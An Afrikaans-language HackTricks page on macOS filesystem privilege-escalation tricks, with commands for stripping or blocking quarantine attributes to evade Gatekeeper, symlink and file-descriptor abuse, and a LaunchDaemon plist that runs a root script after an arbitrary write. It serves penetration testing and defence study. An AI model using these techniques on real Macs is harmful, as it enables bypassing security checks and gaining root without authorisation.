# macOS FS-truuks

<details>

<summary><strong>Leer AWS-hacking van nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy jou **maatskappy geadverteer wil sien in HackTricks** of **HackTricks in PDF wil aflaai**, kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Deel jou hacktruuks deur PRs in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.

</details>

## POSIX-toestemmingskombinasies

Toestemmings in 'n **gids**:

* **lees** - jy kan die gidsinskrywings **opnoem**
* **skryf** - jy kan **lêers** in die gids **verwyder/skryf** en jy kan **leë gidslyste verwyder**.&#x20;
* Maar jy **kan nie nie-leë gidslyste verwyder/wysig** tensy jy skryftoestemmings daaroor het.
* Jy **kan nie die naam van 'n gids wysig** tensy jy die eienaar daarvan is.
* **uitvoer** - jy mag die gids **deursoek** - as jy nie hierdie reg het nie, kan jy nie enige lêers daarin of in enige subgidse toegang nie.

### Gevaarlike kombinasies

**Hoe om 'n lêer/gids wat deur root besit word, te oorskryf**, maar:

* Een ouer **gids-eienaar** in die pad is die gebruiker
* Een ouer **gids-eienaar** in die pad is 'n **gebruikersgroep** met **skryftoegang**
* 'n Gebruikers **groep** het **skryf** toegang tot die **lêer**

Met enige van die vorige kombinasies kan 'n aanvaller 'n **sym/hard link** inspuit na die verwagte pad om 'n bevoorregte willekeurige skryf te verkry.

### Gidsroet R+X Spesiale geval

As daar lêers in 'n **gids** is waarin **slegs root R+X-toegang** het, is dit **nie toeganklik vir enigiemand anders nie**. Dus kan 'n kwesbaarheid wat dit moontlik maak om 'n lêer wat deur 'n gebruiker leesbaar is, maar nie gelees kan word as gevolg van daardie **beperking**, van hierdie gids **na 'n ander een** te skuif, misbruik word om hierdie lêers te lees.

Voorbeeld in: [https://theevilbit.github.io/posts/exploiting\_directory\_permissions\_on\_macos/#nix-directory-permissions](https://theevilbit.github.io/posts/exploiting\_directory\_permissions\_on\_macos/#nix-directory-permissions)

## Simboliese skakel / Harde skakel

As 'n bevoorregte proses data skryf in 'n **lêer** wat deur 'n **laer bevoorregte gebruiker** beheer kan word, of wat voorheen deur 'n laer bevoorregte gebruiker geskep kon word. Die gebruiker kan dit net **na 'n ander lêer verwys** deur middel van 'n simboliese of harde skakel, en die bevoorregte proses sal op daardie lêer skryf.

Kyk na die ander afdelings waar 'n aanvaller 'n willekeurige skryf kan misbruik om voorregte te verhoog.

## .fileloc

Lêers met die **`.fileloc`**-uitbreiding kan na ander programme of binêre lêers verwys, sodat wanneer hulle oopgemaak word, die toepassing/binêre lêer uitgevoer sal word.\
Voorbeeld:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>URL</key>
<string>file:///System/Applications/Calculator.app</string>
<key>URLPrefix</key>
<integer>0</integer>
</dict>
</plist>
```
## Willekeurige FD

As jy 'n **proses kan laat 'n lêer of 'n vouer met hoë bevoegdhede oopmaak**, kan jy **`crontab`** misbruik om 'n lêer in `/etc/sudoers.d` oop te maak met **`EDITOR=exploit.py`**, sodat die `exploit.py` die FD na die lêer binne-in `/etc/sudoers` kan kry en dit misbruik.

Byvoorbeeld: [https://youtu.be/f1HA5QhLQ7Y?t=21098](https://youtu.be/f1HA5QhLQ7Y?t=21098)

## Vermy truuks met quarantine xattrs

### Verwyder dit
```bash
xattr -d com.apple.quarantine /path/to/file_or_app
```
### uchg / uchange / uimmutable vlag

As 'n lêer/gids hierdie onveranderlike eienskap het, sal dit nie moontlik wees om 'n xattr daarop te plaas nie.
```bash
echo asd > /tmp/asd
chflags uchg /tmp/asd # "chflags uchange /tmp/asd" or "chflags uimmutable /tmp/asd"
xattr -w com.apple.quarantine "" /tmp/asd
xattr: [Errno 1] Operation not permitted: '/tmp/asd'

ls -lO /tmp/asd
# check the "uchg" in the output
```
### defvfs monteer

'n **devfs**-monteer **ondersteun nie xattr nie**, meer inligting in [**CVE-2023-32364**](https://gergelykalman.com/CVE-2023-32364-a-macOS-sandbox-escape-by-mounting.html)
```bash
mkdir /tmp/mnt
mount_devfs -o noowners none "/tmp/mnt"
chmod 777 /tmp/mnt
mkdir /tmp/mnt/lol
xattr -w com.apple.quarantine "" /tmp/mnt/lol
xattr: [Errno 1] Operation not permitted: '/tmp/mnt/lol'
```
### writeextattr ACL

Hierdie ACL voorkom dat `xattrs` by die lêer gevoeg word.
```bash
rm -rf /tmp/test*
echo test >/tmp/test
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" /tmp/test
ls -le /tmp/test
ditto -c -k test test.zip
# Download the zip from the browser and decompress it, the file should be without a quarantine xattr

cd /tmp
echo y | rm test

# Decompress it with ditto
ditto -x -k --rsrc test.zip .
ls -le /tmp/test

# Decompress it with open (if sandboxed decompressed files go to the Downloads folder)
open test.zip
sleep 1
ls -le /tmp/test
```
### **com.apple.acl.text xattr + AppleDouble**

Die **AppleDouble** lêerformaat kopieer 'n lêer saam met sy ACEs.

In die [**bronkode**](https://opensource.apple.com/source/Libc/Libc-391/darwin/copyfile.c.auto.html) is dit moontlik om te sien dat die ACL-teksvoorstelling wat binne die xattr genaamd **`com.apple.acl.text`** gestoor word, as ACL in die gedekomprimeerde lêer ingestel sal word. So, as jy 'n toepassing saamgepers het in 'n zip-lêer met die **AppleDouble** lêerformaat met 'n ACL wat voorkom dat ander xattrs daarin geskryf kan word... die karantyn-xattr is nie in die toepassing ingestel nie:

Kyk na die [**oorspronklike verslag**](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/) vir meer inligting.

Om dit na te boots, moet ons eers die korrekte ACL-string kry:
```bash
# Everything will be happening here
mkdir /tmp/temp_xattrs
cd /tmp/temp_xattrs

# Create a folder and a file with the acls and xattr
mkdir del
mkdir del/test_fold
echo test > del/test_fold/test_file
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" del/test_fold
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" del/test_fold/test_file
ditto -c -k del test.zip

# uncomporess to get it back
ditto -x -k --rsrc test.zip .
ls -le test
```
(Merk op dat selfs as dit werk, skryf die sandbox die karantyn xattr voor)

Nie regtig nodig nie, maar ek laat dit daar net in geval:

{% content-ref url="macos-xattr-acls-extra-stuff.md" %}
[macos-xattr-acls-extra-stuff.md](macos-xattr-acls-extra-stuff.md)
{% endcontent-ref %}

## Deurloop Kodehandtekeninge

Bundels bevat die lêer **`_CodeSignature/CodeResources`** wat die **hash** van elke enkele **lêer** in die **bundel** bevat. Merk op dat die hash van CodeResources ook **ingebed is in die uitvoerbare lêer**, so ons kan nie daarmee mors nie.

Daar is egter sommige lêers waarvan die handtekening nie nagegaan sal word nie, hierdie het die sleutel "omit" in die plist, soos:
```xml
<dict>
...
<key>rules</key>
<dict>
...
<key>^Resources/.*\.lproj/locversion.plist$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>1100</real>
</dict>
...
</dict>
<key>rules2</key>
...
<key>^(.*/)?\.DS_Store$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>2000</real>
</dict>
...
<key>^PkgInfo$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>20</real>
</dict>
...
<key>^Resources/.*\.lproj/locversion.plist$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>1100</real>
</dict>
...
</dict>
```
Dit is moontlik om die handtekening van 'n bron vanaf die opdraglyn te bereken met:

{% code overflow="wrap" %}
```bash
openssl dgst -binary -sha1 /System/Cryptexes/App/System/Applications/Safari.app/Contents/Resources/AppIcon.icns | openssl base64
```
## Monteer dmgs

'n Gebruiker kan 'n aangepaste dmg monteer, selfs bo-op bestaande lêers. Hier is hoe jy 'n aangepaste dmg-pakket met aangepaste inhoud kan skep:

{% code overflow="wrap" %}
```bash
# Create the volume
hdiutil create /private/tmp/tmp.dmg -size 2m -ov -volname CustomVolName -fs APFS 1>/dev/null
mkdir /private/tmp/mnt

# Mount it
hdiutil attach -mountpoint /private/tmp/mnt /private/tmp/tmp.dmg 1>/dev/null

# Add custom content to the volume
mkdir /private/tmp/mnt/custom_folder
echo "hello" > /private/tmp/mnt/custom_folder/custom_file

# Detach it
hdiutil detach /private/tmp/mnt 1>/dev/null

# Next time you mount it, it will have the custom content you wrote

# You can also create a dmg from an app using:
hdiutil create -srcfolder justsome.app justsome.dmg
```
{% endcode %}

## Willekeurige Skrywes

### Periodieke sh-skripte

As jou skrip geïnterpreteer kan word as 'n **shell-skrip**, kan jy die **`/etc/periodic/daily/999.local`** shell-skrip oorskryf wat elke dag geaktiveer sal word.

Jy kan 'n **gefake** uitvoering van hierdie skrip maak met: **`sudo periodic daily`**

### Daemons

Skryf 'n willekeurige **LaunchDaemon** soos **`/Library/LaunchDaemons/xyz.hacktricks.privesc.plist`** met 'n plist wat 'n willekeurige skrip uitvoer, soos:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.sample.Load</string>
<key>ProgramArguments</key>
<array>
<string>/Applications/Scripts/privesc.sh</string>
</array>
<key>RunAtLoad</key>
<true/>
</dict>
</plist>
```
Net genereer die skrip `/Applications/Scripts/privesc.sh` met die **opdragte** wat jy as root wil uitvoer.

### Sudoers-lêer

As jy **arbitrêre skryfregte** het, kan jy 'n lêer binne die **`/etc/sudoers.d/`**-map skep wat jou **sudo**-bevoegdhede gee.

### PATH-lêers

Die lêer **`/etc/paths`** is een van die belangrikste plekke wat die PATH-omgewingsveranderlike vul. Jy moet root wees om dit te oorskryf, maar as 'n skrip van 'n **bevoorregte proses** 'n **opdrag sonder die volledige pad** uitvoer, kan jy dit dalk **kaap** deur hierdie lêer te wysig.

&#x20;Jy kan ook lêers skryf in **`/etc/paths.d`** om nuwe mappe in die `PATH`-omgewingsveranderlike te laai.

## Verwysings

* [https://theevilbit.github.io/posts/exploiting\_directory\_permissions\_on\_macos/](https://theevilbit.github.io/posts/exploiting\_directory\_permissions\_on\_macos/)

<details>

<summary><strong>Leer AWS-hacking van nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy wil sien dat jou **maatskappy geadverteer word in HackTricks** of **HackTricks aflaai in PDF-formaat**, kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks-uitrusting**](https://peass.creator-spring.com)
* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Deel jou haktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.

</details>
